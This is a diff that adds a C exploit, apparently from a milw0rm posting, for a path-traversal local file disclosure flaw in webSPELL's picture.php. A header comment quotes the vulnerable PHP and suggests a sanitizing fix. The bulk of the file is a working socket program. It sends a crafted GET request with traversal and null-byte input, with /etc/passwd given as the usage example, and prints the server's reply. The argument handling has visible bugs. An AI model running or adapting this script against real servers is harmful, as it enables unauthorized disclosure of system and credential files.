@@ -1,0 +1,125 @@
+/* 
+ * webSPELL <= 4.2.0d Local File Disclosure Exploit (.c linux) 
+ *
+ * by Juri Gianni aka yeat - staker[at]hotmail[dot]it
+ *
+ * Description
+ * -----------
+ * webSPELL contains one flaw that allows an attacker
+ * to disclose a local file. The issue is due to 'picture.php'
+ * script not properly sanitizing user input supplied to
+ * the 'file' GET variable.
+ * -----------
+ * Vulnerability already found by Trex on 4.01.02 version.
+ * Not Fixed. it works with magic_quotes_gpc OFF
+ * Visit http://zeroidentity.org
+ * 
+ * Download on http://www.webspell.org/download.php?fileID=22
+ *
+ * (File: picture.php) code details
+ * --------------------------------
+
+  if(file_exists('images/gallery/large/'.$_GET['id'].'.jpg')) 
+      $file='images/gallery/large/'.$_GET['id'].'.jpg';
+  
+  elseif(file_exists('images/gallery/large/'.$_GET['id'].'.gif')) 
+      $file='images/gallery/large/'.$_GET['id'].'.gif';
+  
+  elseif(file_exists('images/gallery/large/'.$_GET['id'].'.png'))
+      $file='images/gallery/large/'.$_GET['id'].'.png';
+  
+  else $file='';
+
+  $info=getimagesize($file);
+  
+  switch($info[2]) {
+	case 1: Header("Content-type: image/gif"); break;
+	case 2: Header("Content-type: image/jpeg"); break;
+	case 3: Header("Content-type: image/png"); break;
+  }
+
+echo file_get_contents($file);
+?>
+  
+ * ------------------------------ 
+ * Possible Fix:
+ * 
+ * $file = preg_replace('/[^a-zA-Z0-9\_]/','',addslashes($_GET['id']));
+ * 
+ * otherwise if $_GET['id'] variable is an integer use intval() function.
+ * 
+ * $file = intval($_GET['id']);
+ * 
+ * -----------------------------
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+
+#define GET  "GET %s/picture.php?id=%s HTTP/1.1\r\n" \
+             "Host: %s\r\n" \
+             "User-Agent: Links (2.1pre26; Linux 2.6.19-gentoo-r5 x86_64; x)\r\n" \
+             "Connection: close\r\n\r\n"
+             
+             
+
+char *getHost (char *host)
+{ 
+    struct hostent *hp;
+    struct in_addr **y;
+    
+    hp = gethostbyname(host);
+    y = (struct in_addr **)hp->h_addr_list;
+    
+    return inet_ntoa(**y);
+}
+
+
+int main (int argc,char **argv)
+{
+    int server,leak;
+    char data[1024],html[5000];
+    char packet[500],loadsf[5000];
+
+    struct sockaddr_in addr;
+    
+    if (argc < 3) {
+       printf("Usage: %s host /path file\n",argv[0]);
+       printf("RunEx: %s localhost /webSPELL ../../../../../etc/passwd\n",argv[0]);
+       exit(0);
+    }   
+    
+    server = socket(AF_INET,SOCK_STREAM,0);
+    
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons((int)80);
+    addr.sin_addr.s_addr = inet_addr(getHost(argv[1]));
+    
+    leak = connect(server,(struct sockaddr*)&addr,sizeof(addr));
+    
+    if (leak < 0) {
+       printf("connection refused..try again\n");
+       exit(0);
+    }   
+    
+    strncat(argv[3],"%00",sizeof(argv[3]));
+    snprintf(packet,sizeof(packet),GET,argv[2],argv[3],argv[1]);   
+        
+    if (send(server,packet,sizeof(packet),0) < 0) {
+       printf("data sent error..\n");
+    }   
+       
+    while(recv(server,html,sizeof(html),0) > 0) {   
+        printf("%s",html);  
+    }  
+    
+    return 0;
+}
+
+// milw0rm.com [2009-04-28]
